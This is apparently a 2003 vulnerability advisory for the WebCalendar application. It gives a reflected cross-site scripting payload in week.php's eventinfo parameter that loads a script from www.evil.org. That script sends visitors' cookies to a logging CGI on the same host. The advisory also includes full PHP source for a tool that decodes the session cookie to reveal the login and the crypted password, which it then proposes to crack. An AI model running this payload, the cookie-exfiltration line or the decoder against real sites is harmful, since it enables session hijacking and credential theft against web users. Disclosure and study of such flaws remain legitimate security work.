===============================================================================================
Advisory:
http://nocon.darkflame.net/CSS/Wecalendar.txt

Demo:   
http://nocon.darkflame.net/CSS/decode.php

POC:
-----------------
http://www.host.name/webcalendar/week.php?eventinfo=<script src=http://www.evil.org/evilcode.js</script>

"evilcode.js"
<--------------->
window.open('http://www.evil.org/cgi-bin/logcookie.cgi?'+document.cookie);
<--------------->

  We can then use the code provided in the files includes/functions.php and
includes/validate.php to decode the "webcalendar_session" hash taken from the 
cookie.

>From functions.php:
<----------------->
// Extract a user's name from a session id
// This is a lame attempt at security.  Otherwise, users would be
// able to edit their cookies.txt file and set the username in plain
// text.
<----------------->

   Example:

     webcalendar_session=838ea889b26c9772819d709b826e7b8f926d;

     Hash: 838ea889b26c9772819d709b826e7b8f926d
     Decoded:
        Login: demo
        Passw: Mn7ggQrGTEpi2

  We can then run a standard unix password cracking program on "Mn7ggQrGTEpi2"

- nocon
Date: Wed Sep 3 2003
http://nocon.darkflame.net/

================================================================================================
                             Begin webcaldecode.php
<---------------------------------------------------------------------------------------------->


<head>
    <title> Webcalendar Cookie Decode </title>
</head>

<form method=post action="<? echo $PHP_SELF ?>">
<table width="200" border="0" cellspacing="1" cellpadding="0" bgcolor="#000000">
<tr><td>
   <table width="100%" border="0" cellspacing="2" cellpadding="2" bgcolor="#FFFFFF">
      <tr align="center">
        <td colspan="2">Webcalendar Cookie Decode <br> <a href=http://nocon.darkflame.net/>
        http://nocon.darkflame.net/</a> <br><br>
       </td>
      </tr>
     <tr>
    <td><strong>Hash</strong></td>  
    <td align="right"><input type="text" name="hash" size="60"></td>
   </tr>
<tr>
    <td>&nbsp;</td>
    <td align="center"> <input type="submit" value="Decode"></td>
</tr>
</table>
    </td>
</tr>
</table>
</form>

<?php

$encoded_login = $HTTP_POST_VARS['hash'];
$offsets = array ( 31, 41, 59, 26, 54 );

function hextoint ( $val ) {
  if ( empty ( $val ) )
    return 0;
  switch ( strtoupper ( $val ) ) {
    case "0": return 0;
    case "1": return 1;
    case "2": return 2;
    case "3": return 3;
    case "4": return 4;
    case "5": return 5;
    case "6": return 6;
    case "7": return 7;
    case "8": return 8;
    case "9": return 9;
    case "A": return 10;
    case "B": return 11;
    case "C": return 12;
    case "D": return 13;
    case "E": return 14;
    case "F": return 15;
  }
  return 0;
}

function decode_string ( $instr ) {
  global $offsets;
  $orig = "";
  for ( $i = 0; $i < strlen ( $instr ); $i += 2 ) {
    $ch1 = substr ( $instr, $i, 1 );
    $ch2 = substr ( $instr, $i + 1, 1 );
    $val = hextoint ( $ch1 ) * 16 + hextoint ( $ch2 );
    $j = ( $i / 2 ) % count ( $offsets );
    $newval = $val - $offsets[$j] + 256;
    $newval %= 256;
    $dec_ch = chr ( $newval );
    $orig .= $dec_ch;
  }
  return $orig;
}

$login_pw = split('\|', decode_string ($encoded_login));
$login = $login_pw[0];
$cryptpw = $login_pw[1];

echo "<b> Login:</b> $login <br>";
echo "<b> Passw:</b> $cryptpw <br>";

?>
